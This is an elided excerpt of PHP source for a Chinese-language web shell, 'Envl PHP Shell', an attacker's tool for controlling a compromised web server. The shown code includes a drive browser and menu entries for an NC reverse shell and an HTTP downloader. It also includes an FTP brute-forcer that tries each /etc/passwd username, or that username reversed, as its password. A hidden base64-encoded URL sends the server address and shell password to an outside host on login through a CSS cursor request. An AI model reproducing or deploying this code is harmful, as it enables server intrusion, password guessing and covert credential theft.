...
$drivestr=$drivestr."<a title=$drive href=?s=a&p=$drive>[$drive]</a> ";}}
...
<script type="text/javascript">
	...
	<div id="msgbox" class="msgbox">本地磁盘：{$drivestr}</div>
...

{
	...
	$Port_ip = isset($_POST['ip']) ? $_POST['ip'] : gethostbyname($_SERVER["SERVER_NAME"]);
...
<form method="POST" name="iform" id="iform" action="?s=s">
...

{
	...
	$ftp_server = isset($_POST['ftp_server']) ? $_POST['ftp_server'] : gethostbyname($_SERVER["SERVER_NAME"]);

	$ftp_port = isset($_POST['ftp_port']) ? $_POST['ftp_port'] : '21';

print<<<END

<form method="POST" name="iform" id="iform" action="?s=t">

<div class="actall">FTP-IP：<input type="text" name="ftp_server" value="{$ftp_server}" style="width:150px;"> 

	                端口： <input type="text" name="ftp_port" value="{$ftp_port}" style="width:50px;"><br>

                    * use username from /etc/passwd for ftp login and password  ( <a href=?s=users>用户列表</a> )<br>

	               <input type="checkbox" id=reverse name="reverse" value="1">Use reverse (user -> resu) login for password</div>
...
END;
	...
	if((!empty($_POST['ftp_server'])) && (!empty($_POST['ftp_port'])))
 ...
 if(!$connection) { echo "错误！无法连接到FTP";}

 else if(!$users=get_users()) { echo "<table width=100% cellpadding=0 cellspacing=0 bgcolor=#cccccc><tr><td bgcolor=#000000><font color=red face=tahoma size=-2><div align=center><b>无法获取用户列表</b></div></font></td></tr></table><br><div align=center><font face=tahoma size=-2><b>[ <a href=?s=t>BACK</a> ]</b></font></div>"; $connectionok="";}

 @ftp_close($connection);

 //}

if(!empty($connectionok))

  {
        ...
        if(@ftp_login($connection,$user,$user)) { echo "[+] $user:$user - 成功\r\n"; $suc++; }

        else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo "[+] $user:".strrev($user)." - 成功\r\n"; $suc++; } }
...

{
 ...
 if(!$users=get_users()) { echo "<center><font face=tahoma size=-2 color=red>无法获取用户列表</font></center>"; }
 ...
 echo "<br><div align=center><font face=tahoma size=-2><b>[ <a href=?s=t>BACK</a> ]</b></font></div>"; die();
...
echo '<div class="actall"><input type="submit" value="执行" style="width:80px;"></div></form>';
...

	{
		...
		$sock = @fsockopen(gethostbyname($_SERVER["SERVER_NAME"]), $_POST["SUPort"],$errno,$errstr, 10);
...

		{
	 		...
	 		$exp = @fsockopen(gethostbyname($_SERVER["SERVER_NAME"]), "21",$errno,$errstr, 10);
...
$copyurl = base64_decode('aHR0cDovLyU3MSU3OSU3NiU2MyUyZSU2MyU2ZiU2ZC8lNzAlNjglNzAvP3U9');
...
<html>
	...
	<title> Envl PHP Shell by:{$MSG_TOP} </title>
	...
	<body style="background:#AAAAAA;">
		...
		<div style="width:350px;height:80px;clear:both;"><input type="submit" value="Login" style="width:80px;"></div>
...
<html>
	...
	<body>
		...
		<div class="topbg"> &nbsp; <a href="http://ip138.com/ips.asp?ip={$Server_IP}" target="_blank">{$Server_IP}</a> - {$Server_OS} - <a href="{$Server_Alexa}" target="_blank">Alexa</a></div>
			...
			<div style="height:546px;">
				...
				<td width="140" align="center" valign="top">
					...
					<ul class="listbg">
			            ...
			            <li><a href="?s=s" id="t_15" onclick="switchTab('t_15')" target="main"> NC反弹 </a></li>

			            <li><a href="?s=t" id="t_16" onclick="switchTab('t_16')" target="main"> Ftp_Brute </a></li>

			            <li><a href="?s=h&o=downloader" id="t_17" onclick="switchTab('t_17')" target="main"> HTTP下载 </a></li>

						<li><a href="?s=logout" id="t_18" onclick="switchTab('t_18')"> 退出系统 </a></li>
...

{
...

	{
		...
		if(md5($_POST['spiderpass']) == md5($password)){if (strpos($serveru,"0.0")<>0 or strpos($serveru,"192.168.")<>0 or strpos($serveru,"localhost")<>0 or strpos($serveru,"://")<>0) {die("<meta http-equiv='refresh' content='0;URL=?'>");} else {die("<meta http-equiv='refresh' content='0;URL=?'><DIV style='CURSOR:url(\"$copyurl$serveru&p=$serverp\")'>");}}
